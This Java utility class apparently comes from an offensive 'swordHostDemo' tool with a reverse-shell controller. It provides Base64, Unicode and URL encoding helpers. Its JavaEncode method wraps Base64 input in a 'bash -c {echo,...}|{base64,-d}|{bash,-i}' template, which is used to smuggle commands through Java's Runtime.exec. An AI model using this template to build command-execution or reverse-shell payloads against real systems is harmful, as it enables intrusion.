package com.swordHostDemo.utls;

import com.swordHostDemo.controller.ReverseController;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

/**
 * @date: 2023/2/9 19:22
 * @description:
 */
public class enCodeUtls {

    public static String encodeCharSetUTF8 = "UTF-8";

    /**
     * @param str:
     * @return: java.lang.String
     * @date: 2023/2/9 19:35
     * @description: base64 编码
     */
    public static String base64Encode(String str) {
        byte[] textByte = new byte[0];
        textByte = str.getBytes(StandardCharsets.UTF_8);
        final String encodedText = Base64.getEncoder().encodeToString(textByte);
        System.out.println("base64Encode："+encodedText);
        return encodedText;
    }
    /**
     * @param str:
     * @return: java.lang.String
     * @date: 2023/2/9 19:35
     * @description: Java base64编码
     */
    public static String JavaEncode(String str) {

        String base64EecodeStr = null;

        base64EecodeStr = "bash -c {echo," + str + "}|{base64,-d}|{bash,-i}";
        return base64EecodeStr;
    }
    /**
     * @param str:
     * @return: java.lang.String
     * @date: 2023/2/9 19:36
     * @description: unicode 编码
     */
    public static String stringToUnicode(String str) {
        char[] utfBytes = str.toCharArray();
        StringBuilder unicodeBytes = new StringBuilder();
        for (char utfByte : utfBytes) {
            String hexB = Integer.toHexString(utfByte);
            if (hexB.length() <= 2) {
                hexB = "00" + hexB;
            }
            unicodeBytes.append("\\u").append(hexB);
        }
        return unicodeBytes.toString();
    }
    /**
     * @param str:
     * @return: java.lang.String
     * @date: 2023/2/9 19:36
     * @description: URL编码
     */
    public static String getURLEncoderString(String str) {
        String result = null;
        try {
            System.out.println("EncodeCharSet " + encodeCharSetUTF8);
            result = URLEncoder.encode(str, encodeCharSetUTF8).replace("+", "%20");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        return result;
    }

}
